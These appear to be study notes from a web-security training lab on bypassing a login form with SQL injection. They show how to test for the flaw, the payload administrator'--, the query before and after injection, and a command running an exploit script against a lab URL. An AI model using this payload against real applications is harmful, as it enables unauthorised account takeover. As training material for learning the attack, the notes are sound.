SQL injection vulnerability allowing login bypass, without knowing admin password

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

To implement this manually, first check if application is vulnerable to SQL injection, how? 
Add ' in password, you would get internal server error


Once confirmed, instead of giving administrator in username, give administrator'-- and anything in password
Above payload means, you are adding a valid username i.e. administrator but closing quotes and comments, so password isn't required. 


Before
SELECT * FROM users WHERE username = 'administrator' AND password = 'password1'

SELECT * from users WHERE username= 'administrator'-- AND password = 'password1'

==
Before writing code, we understood why we are using sessions

CSRF- Cross site request forgery
Get csrf token
Create exploit function with csrf, url and sqli payload as input


Final output command

python3 sqli-lab-02.py "https://0ad8002103a880198cc323ca00370061.web-security-academy.net/login" " administrator'-- "
